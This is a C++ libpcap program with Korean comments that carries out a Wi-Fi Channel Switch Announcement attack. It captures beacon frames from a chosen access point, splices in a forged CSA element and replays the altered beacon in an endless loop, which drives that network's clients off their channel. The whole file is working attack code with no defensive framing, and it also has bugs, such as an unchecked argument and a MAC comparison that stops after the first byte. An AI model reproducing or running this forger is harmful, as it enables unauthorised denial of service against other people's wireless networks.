#include "csa.h"

void send_packet_with_inserted_csa(const std::string& dev, const u_char* packet, size_t packet_len,int offset) {
	struct csa csa_data;
    char errbuf[PCAP_ERRBUF_SIZE];
    size_t new_packet_len = packet_len + sizeof(struct csa);
    int insert_position = -1;
	uint8_t channel = 0x00;
    // pcap 핸들 열기
    pcap_t* sendhandle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (sendhandle == NULL) {
        std::cerr << "Couldn't open device " << dev << ": " << errbuf << std::endl;
        return;
    }

    // 패킷 순회하여 삽입 위치 찾기
    while (offset < packet_len) {
        struct info_element* ie = (struct info_element*)(packet + offset);
        int next_offset = offset + 2 + ie->length;
		if (ie->id == 3 && ie->length == 1) {
			channel = (ie->data[0]) * 2;
		}
		
        if (next_offset < packet_len) {
            struct info_element* next_ie = (struct info_element*)(packet + next_offset);
            if (ie->id <= 0x25 && next_ie->id > 0x25) {
                insert_position = next_offset;
				csa_data.new_channel = channel;
                break;
            }
        }
        offset = next_offset;
    }

    if (insert_position != -1) {
        std::vector<u_char> new_packet;
        new_packet.reserve(new_packet_len);
        // 패킷의 시작부터 삽입 위치까지 복사
        new_packet.insert(new_packet.end(), packet, packet + insert_position);
        // csa 구조체 삽입
        new_packet.insert(new_packet.end(), reinterpret_cast<u_char*>(&csa_data), reinterpret_cast<u_char*>(&csa_data) + sizeof(struct csa));
        // 나머지 부분 복사
        new_packet.insert(new_packet.end(), packet + insert_position, packet + packet_len);
        // 패킷 전송
        while (1) {
            if (pcap_sendpacket(sendhandle, new_packet.data(), new_packet_len) != 0) {
                std::cerr << "Error sending the packet: " << pcap_geterr(sendhandle) << std::endl;
            }
            std::cerr << "SEND" << std::endl;
        }
    } else {
        std::cout << "No suitable position for csa insertion found" << std::endl;
    }

    pcap_close(sendhandle);
}

void usage() {
	printf("syntax: ./ad <interface>\n");
	printf("sample: ./ad wlan0\n");
}

typedef struct {
	char* dev_;
} Param;

Param param = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	param->dev_ = argv[1];
	return true;
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;
	int status;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
	while (true) {
		status = 0;
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;

		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		uint8_t send[6];
    	uint8_t des[6];

    	//char* apMac에 저장되어 있는 Mac주소를 스트림으로 변환
    	std::istringstream apMacStream(argv[2]);
		int value;
		char colon;

		for (int i = 0; i < 6; ++i) {
    		if (!(apMacStream >> std::hex >> value)) {
        		std::cerr << "MAC 주소 파싱 실패: 유효하지 않은 형식" << std::endl;
        		exit(EXIT_FAILURE); // 또는 적절한 에러 처리
    		}
    		if (i < 5 && !(apMacStream >> colon)) {
        		std::cerr << "MAC 주소 파싱 실패: 구분자 오류" << std::endl;
        		exit(EXIT_FAILURE); // 또는 적절한 에러 처리
    		}
    		if (value < 0 || value > 255) {
	        	std::cerr << "MAC 주소 파싱 실패: 값 범위 초과" << std::endl;
    	    	exit(EXIT_FAILURE); // 또는 적절한 에러 처리
    		}
    		send[i] = static_cast<uint8_t>(value);
		}

		struct ieee80211_radiotap_header *rheader = (struct ieee80211_radiotap_header*)packet;
		struct beacon_frame *beacon = (struct beacon_frame*)(packet+(rheader->it_len));
		int x = packet[rheader->it_len];

		if(x != 0x80)
			continue;
		
		for(int i =0;i<6;i++){
			if(send[i] != beacon->header.sourceaddr4[i])
			status++;
			break;
		}

		if(status != 0)
			continue;
			
		int beacon_frame_offset = rheader->it_len + sizeof(struct ieee80211_header) + sizeof(struct beacon_frame_fixed);
		send_packet_with_inserted_csa(param.dev_,packet,header->caplen,beacon_frame_offset);
	}
	pcap_close(pcap);
	return 0;
}
